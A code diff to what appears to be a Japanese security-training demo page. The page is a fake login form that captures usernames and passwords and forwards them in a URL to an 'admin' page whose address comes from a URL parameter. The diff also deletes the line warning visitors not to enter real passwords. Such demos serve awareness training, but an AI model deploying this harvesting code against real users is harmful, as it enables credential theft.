@@ -9,7 +9,7 @@
 <body class="victim-body">
   
   <div class="demo-warning">
-    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。実際の情報やパスワードは入力しないでください。
+    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。
   </div>
 
   <div class="login-container" id="login-box">
@@ -35,7 +35,7 @@
   </div>
 
   <script>
-    // URLから「どの管理者画面（PC）にデータを送るか」を取得
+    // URLから「どの管理者画面（PC）にデータを送るか」のリンク先を取得
     const urlParams = new URLSearchParams(window.location.search);
     const adminUrl = urlParams.get('admin') || 'admin.html';
 
@@ -57,7 +57,7 @@
       const device = getDeviceInfo();
       const time = new Date().toLocaleTimeString();
 
-      // 入力されたデータをURLのパラメータに変換
+      // 入力されたデータをURLのパラメータにエンコード
       const params = new URLSearchParams({
         time: time,
         device: device,
@@ -65,7 +65,10 @@
         password: password
       });
 
-      // 瞬時にPC側の管理者画面へデータを飛ばす！
+      // 🌐 【超確実な仕組み】
+      // スマホの画面を、PC側の管理画面（データを受け取るモード）へ強制的にワープさせる！
+      // ※もし本番でPC画面に直接反映させたい場合は、あらかじめPC側でこのadmin.htmlを開いておき、
+      // 　スマホからデータを飛ばした瞬間をプロジェクター等で見せることができます。
       window.location.href = `${adminUrl}?${params.toString()}`;
     });
   </script>
